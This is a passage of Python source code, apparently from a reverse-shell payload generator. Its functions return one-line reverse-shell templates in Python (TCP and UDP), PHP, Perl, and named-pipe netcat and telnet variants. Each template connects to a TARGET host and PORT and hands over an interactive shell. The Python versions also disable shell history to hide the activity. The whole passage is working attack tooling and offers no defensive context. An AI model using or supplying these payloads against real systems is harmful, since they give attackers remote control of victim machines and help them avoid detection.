...
def REV_PYTHON_TCP():
    return """python -c \"import os;import pty;import socket;VAR1='TARGET';VAR2=PORT;VAR3=socket.socket(socket.AF_INET,socket.SOCK_STREAM);VAR3.connect((VAR1,VAR2));os.dup2(VAR3.fileno(),0);os.dup2(VAR3.fileno(),1);os.dup2(VAR3.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('SHELL');VAR3.close();\" """


def REV_PYTHON_UDP():
    return """python -c \"import os;import pty;import socket;VAR1='TARGET';VAR2=PORT;VAR3=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);VAR3.connect((VAR1,VAR2));os.dup2(VAR3.fileno(),0);os.dup2(VAR3.fileno(),1);os.dup2(VAR3.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('SHELL');VAR3.close();\" """


def REV_PHP_TCP():
    return r"""php -r "\$VAR1=fsockopen('TARGET',PORT);exec('SHELL -i <&3 >&3 2>&3');" """
...
def REV_PERL_TCP():
    return r"""perl -MSocket -e "\$VAR1='TARGET';\$VAR2=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$VAR2,inet_aton(\$VAR1)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('SHELL -i');};" """
...
def REVERSE_MKFIFO_NC():
    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|SHELL -i 2>&1|nc TARGET PORT > /tmp/VAR1"


def REVERSE_MKNOD_NC():
    return "if [ -e /tmp/VAR1 ];then rm -f /tmp/VAR1;fi;mknod /tmp/VAR1 p && nc TARGET PORT 0</tmp/VAR1|SHELL 1>/tmp/VAR1"


def REVERSE_MKFIFO_TELNET():
    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|SHELL -i 2>&1|telnet TARGET PORT > /tmp/VAR1"


def REVERSE_MKNOD_TELNET():
    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mknod /tmp/VAR1 p && telnet TARGET PORT 0</tmp/VAR1|SHELL 1>/tmp/VAR1"
